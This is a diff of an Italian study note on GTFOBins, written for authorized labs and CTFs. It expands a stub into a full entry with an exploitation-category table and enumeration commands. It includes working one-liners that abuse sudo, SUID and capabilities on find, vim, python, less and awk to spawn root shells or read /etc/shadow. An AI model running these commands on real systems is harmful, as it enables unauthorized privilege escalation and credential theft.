@@ -2,39 +2,100 @@
 tipo: entita
 tag: [linux, tool, metodologia]
 fase: 2
-fonti: 0
+fonti: 3
 aggiornato: 2026-06-26
-stato: stub
+stato: maturo
 aliases: ["GTFOBins"]
 ---
 
 # GTFOBins
 
-> [!info] Stub
-> Risorsa di riferimento per la privilege escalation Unix. Da espandere.
-
 **GTFOBins** (*Get The F*** Out Binaries*) = catalogo online di **binari Unix legittimi** che possono
-essere abusati per bypassare restrizioni e fare [[Privilege Escalation Linux|privilege escalation]].
-Sito: https://gtfobins.github.io.
+essere abusati per bypassare restrizioni locali ed effettuare [[Privilege Escalation Linux|privilege escalation]],
+evadere shell ristrette o esfiltrare dati. Sito: https://gtfobins.github.io. È il riferimento
+"quale binario posso sfruttare?" durante l'enumerazione post-foothold. Equivalente Windows-side: **LOLBAS**.
 
-## A cosa serve
+> [!warning] Etica e legge
+> Le tecniche qui descritte servono **solo** su sistemi tuoi o in lab/CTF autorizzati
+> ([[TryHackMe]], [[HackTheBox]]). Abusare di un binario per scalare privilegi su un sistema di
+> terzi senza autorizzazione scritta è reato. Vedi [[Penetration Testing]].
 
-Dato un binario (es. `vim`, `find`, `cp`, `tar`, `less`), GTFOBins elenca come sfruttarlo a seconda
-del contesto:
+## Idea di fondo
 
-- **`sudo`** — se è eseguibile via [[sudo]], spesso si ottiene una shell root (`sudo find . -exec /bin/sh \;`).
-- **SUID** — se ha il bit [[SUID e SGID|SUID]], stessa idea con shell che mantiene l'uid privilegiato.
-- **Capabilities** — abusi via [[Capabilities Linux]] (es. `cap_setuid`).
-- Altri: lettura/scrittura file arbitrari, download, bind/reverse shell.
+Molti binari standard espongono funzioni "innocue" (eseguire un comando, leggere/scrivere file,
+aprire una shell interna) che diventano **pericolose quando il binario gira con privilegi elevati**.
+GTFOBins indicizza il binario e, per ogni **funzione** abusabile, indica la categoria di sfruttamento:
 
-## Workflow tipico
+| Categoria | Condizione richiesta | Risultato |
+|-----------|----------------------|-----------|
+| **Shell** | Binario eseguibile via `sudo` o con bit SUID | Spawn di `/bin/sh` con privilegi del binario |
+| **SUID** | Bit [[SUID e SGID|SUID]] impostato (`-rwsr-xr-x`) | Shell che mantiene l'**euid** (spesso root) |
+| **Sudo** | Voce in `sudo -l` per quel binario | Comando/shell come l'utente target (root) |
+| **Capabilities** | [[Capabilities Linux]] come `cap_setuid+ep` | Privilegio specifico senza SUID completo |
+| **File read / write** | Privilegio in lettura/scrittura | Leggere `/etc/shadow`, scrivere `/etc/passwd` |
+| **Limited SUID / shell escape** | Shell ristretta (`rbash`, `lshell`) | Evasione verso shell completa |
+| **Bind / Reverse shell** | — | Listener o callback di rete |
 
-1. Enumera con [[PEAS|linpeas]] / `sudo -l` / `find / -perm -4000`.
-2. Cerca il binario su GTFOBins.
-3. Applica la tecnica per la categoria giusta (`sudo`, `suid`, `capabilities`…).
+## Workflow operativo
 
-Equivalente Windows-side: LOLBAS. Per editor specifici: [[Vim e Nano]].
+1. **Enumera** i vettori disponibili:
+
+```bash
+sudo -l                              # cosa posso eseguire via sudo (anche NOPASSWD)
+find / -perm -4000 -type f 2>/dev/null   # binari con bit SUID
+getcap -r / 2>/dev/null              # binari con capabilities
+# Oppure automatizzato:
+./linpeas.sh                         # vedi [[PEAS]]
+```
+
+2. **Cerca il binario** su GTFOBins (es. `find`, `vim`, `tar`, `less`, `awk`, `python`) nella
+   categoria che combacia col vettore trovato (sudo / suid / capabilities).
+3. **Applica** la tecnica.
+
+### Esempi reali
+
+```bash
+# --- SUDO: find eseguibile via sudo -> shell root ---
+sudo find . -exec /bin/sh \; -quit
+
+# --- SUDO: vim -> shell root tramite comando interno ---
+sudo vim -c ':!/bin/sh'
+
+# --- SUID: il binario find ha il bit SUID -> mantiene euid ---
+find . -exec /bin/sh -p \; -quit     # -p preserva i privilegi nella shell
+
+# --- SUID: python con bit SUID -> shell privilegiata ---
+./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+# --- CAPABILITIES: python con cap_setuid+ep ---
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# --- FILE READ: less/cat SUID per leggere file protetti ---
+sudo less /etc/shadow
+
+# --- SHELL ESCAPE da una shell ristretta tramite awk ---
+awk 'BEGIN {system("/bin/sh")}'
+```
+
+> [!note] Perché `-p` conta
+> Bash e dash, all'avvio, **droppano** l'euid privilegiato se non viene passato `-p`. Per questo
+> nello sfruttamento SUID si lancia `/bin/sh -p`: senza, la shell ritorna all'uid reale e l'escalation fallisce.
+
+## Lab
+
+- **TryHackMe**: *Linux PrivEsc*, *Linux Privilege Escalation*, *Common Linux Privesc*,
+  *Linux Agency*, percorso *Jr Penetration Tester*.
+- **HackTheBox**: box Linux "easy/medium" con vettori sudo/SUID (es. *Lame*, *Shocker*, *Bashed*),
+  **HTB Academy** modulo *Linux Privilege Escalation*.
+- **pwn.college** — modulo *Program Misuse* (sfruttamento sistematico di binari SUID).
 
 ## Collegamenti
 
 - [[Privilege Escalation Linux]] · [[SUID e SGID]] · [[sudo]] · [[Capabilities Linux]] · [[PEAS]]
+- [[Vim e Nano]] · [[HackTricks]] · [[Penetration Testing]] · [[Post-Exploitation]]
+
+## Fonti
+
+- GTFOBins: https://gtfobins.github.io
+- LOLBAS (equivalente Windows): https://lolbas-project.github.io
+- HackTricks — Linux Privilege Escalation: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
